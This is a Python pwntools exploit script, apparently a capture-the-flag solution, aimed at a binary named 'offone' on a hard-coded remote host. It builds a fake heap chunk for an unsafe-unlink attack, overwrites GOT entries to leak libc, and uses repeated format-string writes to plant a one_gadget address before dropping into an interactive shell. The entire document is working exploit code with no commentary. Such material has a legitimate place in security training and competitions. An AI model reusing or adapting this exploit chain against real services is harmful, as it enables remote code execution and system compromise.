from pwn import *

debug=0
context.log_level='debug'
e=ELF('./libc.so')

if debug:
    p=process('offone',env={'LD_PRELOAD':'./libc.so'})
    gdb.attach(p)
else:
    p=remote('47.75.154.113', 9999)

def ru(x):
    return p.recvuntil(x)

def se(x):
    p.sendline(x)


def new(idx,content):
    se('1')
    ru('Which? :')
    se(str(idx))
    ru('msg:')
    se(content)
    ru('Which? :')

def edit(idx,content):
    se('2')
    ru('Which? :')
    se(str(idx))
    ru('new msg:')
    p.send(content)
    ru('Which? :')

def wipe(idx):
    se('3')
    ru('Which? :')
    se(str(idx))
    return ru('Which? :')


def write_b(idx,c):
    new(10,'a'*0x60)
    edit(10,'%'+str(st+idx)+'c%6$hhn\n')
    wipe(10)
    new(10,'a'*0x60)
    if c!=0:
        edit(10,'%'+str(c)+'c%8$hhn\n')
    else:
        edit(10,'%8$hhn\n')
    wipe(10)

def write_one(addr,value,length=3):
    for i in range(length):
        write_b(length-1-i,ord(p64(addr)[length-1-i]))
    new(10,'a'*0x60)
    if value!=0:
        edit(10,'%'+str(value)+'c%12$hhn\n')
    else:
        edit(10,'%12$hhn\n')
    wipe(10)

def write(addr,value,length=3):
    tmp=p64(value)
    for i in range(6):
        write_one(addr+i,ord(tmp[i]),length)


new(0,'a'*0x60)
new(1,'b'*0x60)
new(2,'c'*0x60)

new(3,'a'*0x300)
wipe(3)

new(3,'\xff'*0x120)
new(4,'a'*0x190)
edit(4,p64(0x21)*0x24+'\n')

fake_chunk=p64(0)+p64(0xe1)+p64(0x602198-0x18)+p64(0x602198-0x10)
fake_chunk=fake_chunk.ljust(0xe0,'a')
fake_chunk+=p64(0xe0)

edit(3,fake_chunk+'\n')
wipe(4)

edit(3,p32(0x602018)[:3]+'\n')
edit(0,p64(0x4007a0)[:6])

edit(3,'\x00'*3)
wipe(0)
new(0,'a'*0x20)
edit(3,p32(0x602020)[:3]+'\n')

puts=u64(wipe(0)[:6]+'\x00\x00')

edit(3,'\x00'*3)
wipe(0)

base=puts-e.symbols['puts']

one_gadget=base+0x4526a

new(10,'a'*0x200)
edit(10,'%8$lx\n')

stack=int(wipe(10)[:12],16)
st=ord(p64(stack)[0])

write(0x602070,one_gadget,3)

for i in range(6):
    write_b(5-i,ord(p64(stack+0x18)[5-i]))    
new(10,'a'*0x60)
edit(10,'%12$n\n')
wipe(10)

for i in range(6):
    write_b(5-i,ord(p64(stack+0x18+4)[5-i]))
new(10,'a'*0x60)
edit(10,'%12$n\n')
wipe(10)

new(10,'a'*0x200)
edit(10,'%lx-'*0x20+'\n')
wipe(10)




print(hex(stack))

p.interactive()

